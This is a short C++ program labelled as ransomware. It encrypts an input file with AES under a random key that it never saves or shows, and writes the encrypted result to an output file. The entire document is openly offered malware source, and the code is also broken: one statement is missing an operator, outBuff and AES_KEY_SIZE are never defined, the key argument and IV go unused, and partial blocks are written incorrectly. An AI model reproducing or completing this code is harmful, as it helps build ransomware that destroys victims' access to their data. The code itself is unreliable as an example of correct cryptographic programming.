// g++ -o ransomware ransomware.cpp -lcrypto

#include <iostream>
#include <fstream>
#include <string>
#include <openssl/aes.h>

// Function to encrypt file content using AES
void EncryptFile(const std::string& inputFile, const std::string& outputFile, const unsigned char* key) {
    std::ifstream in(inputFile.c_str(), std::ios::binary);
    if (!in.is_open()) {
        std::cerr << "Error opening input file: " << inputFile << std::endl;
        return;
    }

    std::ofstream out(outputFile.c_str(), std::ios::binary | std::ios::trunc);
    if (!out.is_open()) {
        std::cerr << "Error opening output file: " outputFile << std::endl;
        in.close();
        return;
    }

    // Initialize AES cipher
    AES_KEY aesKey;
    AES_set_encrypt_key(key, 256, &aesKey);

    unsigned char iv[AES_BLOCK_SIZE] = {0};
    const int blockSize = AES_BLOCK_SIZE;

    // Process input file and write encrypted data to output file
    while (true) {
        unsigned char inBuff[blockSize];
        int bytesRead = in.readsome(inBuff, blockSize);
        if (bytesRead == 0) break;
        
        AES_encrypt(inBuff, outBuff, &aesKey);

        out.write((char*)outBuff, bytesRead); // write encrypted data

    }

    in.close();
    out.close();
}

// Function to generate a random key
void GenerateRandomKey(unsigned char* key) {
    for (int i = 0; i < AES_KEY_SIZE; ++i)
        key[i] = rand() & 255;
}

int main(int argc, char** argv) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <input file> <output file> <key>" << std::endl;
        return 1;
    }

    std::string inputFile = argv[1];
    std::string outputFile = argv[2];

    // Generate random key
    unsigned char key[AES_KEY_SIZE];
    GenerateRandomKey(key);

    // Encrypt file content with AES algorithm using the generated key
    EncryptFile(inputFile, outputFile, key);

    return 0;
}
